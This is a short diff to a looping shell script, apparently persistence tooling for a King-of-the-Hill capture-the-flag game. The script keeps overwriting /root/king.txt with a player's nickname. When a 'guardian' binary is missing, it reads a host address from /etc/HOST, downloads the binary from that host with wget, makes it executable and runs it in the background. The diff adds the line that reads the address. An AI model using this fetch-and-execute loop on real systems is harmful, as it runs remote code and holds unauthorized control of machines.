@@ -18,9 +18,9 @@ while true; do
         echo "$nick" >> /root/king.txt
         sudo tee /root/king.txt >/dev/null <<< "$nick"
     fi
-
     if [ ! -f "/etc/bin/guardian" ]; then
-        cd /etc/bin && wget "http://$ip_file/guardian" && chmod +x guardian && ./guardian &
+    ip_file=$(cat /etc/HOST)
+      cd /etc/bin && wget "http://$ip_file/guardian" && chmod +x guardian && ./guardian &
     fi
 
     sleep 0.5
